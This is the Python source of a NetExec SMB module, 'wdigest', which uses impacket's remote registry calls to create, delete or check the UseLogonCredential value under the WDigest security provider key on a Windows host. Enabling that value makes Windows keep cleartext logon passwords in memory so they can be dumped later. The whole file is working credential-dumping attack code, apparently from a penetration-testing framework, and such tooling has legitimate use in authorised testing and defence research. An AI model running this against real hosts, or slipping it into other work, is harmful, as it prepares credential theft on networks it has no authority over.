from dataclasses import dataclass
from sys import exit

from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from nxc.helpers.misc import CATEGORY
from nxc.helpers.registry import RegistryValue
from nxc.playbooks.results import ActionResult, ResultStatus


class NXCModule:
    name = "wdigest"
    description = "Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    @dataclass
    class ResultData:
        action: str
        completed: bool = False
        verified: bool = False
        observed: RegistryValue | None = None
        enabled: bool | None = None

    result_type = ResultData

    def options(self, context, module_options):
        """ACTION  Create/Delete the registry key (choices: enable, disable, check)"""
        if "ACTION" not in module_options:
            context.log.fail("ACTION option not specified!")
            exit(1)
        self.action = module_options["ACTION"].lower()
        if self.action not in ("enable", "disable", "check"):
            context.log.fail("Invalid value for ACTION option!")
            exit(1)

    def on_admin_login(self, context, connection):
        result = self.ResultData(self.action)
        remote_ops = None
        handles, errors = [], []
        try:
            remote_ops = RemoteOperations(connection.conn, False)
            remote_ops.enableRegistry()
            rpc = remote_ops._RemoteOperations__rrp
            root = rrp.hOpenLocalMachine(rpc)["phKey"]
            handles.append(root)
            key = None
            try:
                key = rrp.hBaseRegOpenKey(rpc, root, r"SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest")["phkResult"]
                handles.append(key)
            except rrp.DCERPCSessionError as e:
                if e.get_error_code() != 2 or self.action == "enable":
                    raise
                result.observed = RegistryValue()
            if key is not None:
                if self.action == "enable":
                    rrp.hBaseRegSetValue(rpc, key, "UseLogonCredential", rrp.REG_DWORD, 1)
                    result.completed = True
                elif self.action == "disable":
                    try:
                        rrp.hBaseRegDeleteValue(rpc, key, "UseLogonCredential")
                        result.completed = True
                    except rrp.DCERPCSessionError as e:
                        if e.get_error_code() != 2:
                            raise
                result.observed = RegistryValue()
                try:
                    result.observed.registry_type, result.observed.value = rrp.hBaseRegQueryValue(rpc, key, "UseLogonCredential")
                    result.observed.present = True
                except rrp.DCERPCSessionError as e:
                    if e.get_error_code() != 2:
                        result.observed.error = str(e)
                        raise
                except Exception as e:
                    result.observed.error = str(e) or type(e).__name__
                    raise
            if result.observed.present:
                if result.observed.registry_type == rrp.REG_DWORD and result.observed.value in (0, 1):
                    result.enabled = result.observed.value == 1
                else:
                    errors.append("UseLogonCredential has an unexpected registry type or value")
            if self.action == "enable":
                result.verified = result.enabled is True
            elif self.action == "disable":
                result.verified = not result.observed.present
            if self.action != "check" and not result.verified:
                errors.append("Registry read-back did not match the requested change")
        except Exception as e:
            errors.append(str(e) or type(e).__name__)
        finally:
            for handle in reversed(handles):
                try:
                    rrp.hBaseRegCloseKey(rpc, handle)
                except Exception as e:
                    errors.append(f"Closing registry handle: {e}")
            if remote_ops is not None:
                try:
                    remote_ops.finish()
                except Exception as e:
                    errors.append(f"Finishing registry operation: {e}")
        if errors:
            status = ResultStatus.FAILED
            for error in errors:
                context.log.fail(error)
        elif self.action == "check":
            status = ResultStatus.SUCCESS if result.enabled else ResultStatus.NEGATIVE
            context.log.display(f"UseLogonCredential: {result.observed.value if result.observed.present else '(not present)'}")
        else:
            status = ResultStatus.SUCCESS
            context.log.success(f"UseLogonCredential {self.action}: requested registry state verified")
        return ActionResult("smb", self.name, connection.host, status, result, error="; ".join(errors) or None)
